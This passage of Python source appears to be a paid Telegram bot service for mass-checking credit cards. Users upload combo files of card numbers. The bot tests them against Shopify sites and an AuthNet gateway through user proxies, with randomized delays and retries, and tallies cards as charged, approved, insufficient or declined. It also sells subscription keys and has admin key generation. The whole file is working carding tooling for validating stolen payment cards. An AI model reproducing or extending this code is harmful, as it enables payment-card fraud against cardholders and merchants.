    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    
    kb = [
        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
    ]
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    elif is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    elif is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def prompt_redeem_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    t = f"<b>{CE_CANDLE} {sf('Please send your key using the command directly like this')} :</b>\n\n<code>/redeem VIP-XXXXXXXXXX</code>"
    kb = [[InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
    await styled_edit(q.message, t, buttons=kb)

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid in ADMIN_ID: 
        await q.answer("✅ Admin Access", show_alert=True)
        try: await q.message.delete()
        except: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
        return
        
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        await mark_user_joined(uid)
        _JOIN_CACHE[uid] = time.time()
        await q.answer("✅ Verified Successfully!", show_alert=True)
        try: await q.message.delete()
        except Exception: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
    else: await q.answer("❌ Not joined yet!", show_alert=True)

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query
    uid = q.from_user.id
    gn = q.data.split(":")[1]
    await q.answer()
    msg_obj = q.message
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    
    current_workers = 1 if gn == "AuthNet" else WORKERS
    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards); chk = chg = app = ins = dec = err = 0
    st = time.time()
    
    sites = await get_shopify_sites()
    proxies = await get_all_user_proxies(uid)
    if not proxies: proxies = []
    else: proxies = list(proxies) 
    
    http_session = await get_user_http_session(uid)
    last_resp = sf("Waiting for response...")
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    current_workers = 1 if gate_name == "AuthNet" else WORKERS

    async def dashboard_updater():
        while not is_stopped():
            for _ in range(20):
                if is_stopped(): break
                await asyncio.sleep(0.1)
            if is_stopped(): break
            
            elapsed_now = int(time.time() - st)
            cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
            
            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
            percent = int((chk / tot) * 100) if tot > 0 else 0
            
            kb = [
                [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
                [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
                [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
                [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
                [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except asyncio.CancelledError: break
            except Exception: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)
    sem = asyncio.Semaphore(current_workers)

    async def worker(wid):
        await asyncio.sleep(wid * 0.05)
        nonlocal chk, chg, app, ins, dec, err, last_resp
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except Exception: break
            async with sem:
                try:
                    c_st = time.time()
                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
                    if is_stopped(): break 
                    c_el = time.time() - c_st
                    status = res.get('status', 'Dead')
                    chk += 1
                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                    
                    if status == 'Charged':
                        chg += 1
                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
                    elif status == 'Approved': 
                        app += 1
                    elif status == 'Insufficient': 
                        ins += 1
                    elif status == 'Site Error': 
                        err += 1
                    else: 
                        dec += 1
                except asyncio.CancelledError: break
                except Exception: err += 1; chk += 1
                finally:
                    queue.task_done()
            if not is_stopped(): 
                if gate_name == "AuthNet":
                    await asyncio.sleep(0.5) 
                else:
                    await asyncio.sleep(random.uniform(8.0, 14.0))

    wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((chk / el) * 60) if el > 0 else 0
    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
    
    fkb = [
        [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
        [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
        [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
        [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
    ]
    try: await styled_edit(msg_obj, ft, buttons=fkb)
    except Exception: pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_data = update.callback_query.data
    puid = int(key_data.split(":")[1])
    if update.callback_query.from_user.id != puid and update.callback_query.from_user.id not in ADMIN_ID:
        return await update.callback_query.answer("⚠️ Not yours!", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_shopify_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except Exception: pass
    try: await init_db()
    except Exception as e: logger.error(f"DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    bot_defaults = Defaults(parse_mode=ParseMode.HTML, link_preview_options=True)
    app = Application.builder().token(BOT_TOKEN).defaults(bot_defaults).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
    app.add_error_handler(global_error_handler)
    
    app.add_handler(MessageHandler(filters.ALL, master_router))
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    
    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH AUTHNET INTEGRATION & PAYPAL DEACTIVATED!")
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict: time.sleep(5)
        except Exception as e:
            logger.error(f"Fatal error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
